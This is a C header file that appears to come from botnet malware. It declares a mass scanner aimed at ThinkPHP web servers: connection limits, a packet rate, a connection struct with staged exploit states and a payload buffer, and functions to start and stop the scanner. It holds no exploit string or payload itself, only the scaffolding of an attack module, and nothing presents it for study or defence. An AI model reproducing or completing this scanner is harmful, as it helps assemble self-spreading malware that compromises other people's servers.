#pragma once
#ifdef NP_TELNET
#include <stdint.h>
#include "includes.h"

#define THINKPHP_SCANNER_MAX_CONNS 128
#define THINKPHP_SCANNER_RAW_PPS   160
#define THINKPHP_SCANNER_RDBUF_SIZE 256
#define THINKPHP_SCANNER_HACK_DRAIN 64

struct thinkphp_scanner_connection {
	int fd, last_recv;
	enum {
		THINKPHP_SC_CLOSED,
		THINKPHP_SC_CONNECTING,
		THINKPHP_SC_EXPLOIT_STAGE2,
		THINKPHP_SC_EXPLOIT_STAGE3,
	} state;
	ipv4_t dst_addr;
	uint16_t dst_port;
	int rdbuf_pos;
	char rdbuf[THINKPHP_SCANNER_RDBUF_SIZE];
	char payload_buf[1024];
};

void thinkphp_init(void);
void thinkphp_kill(void);
#endif
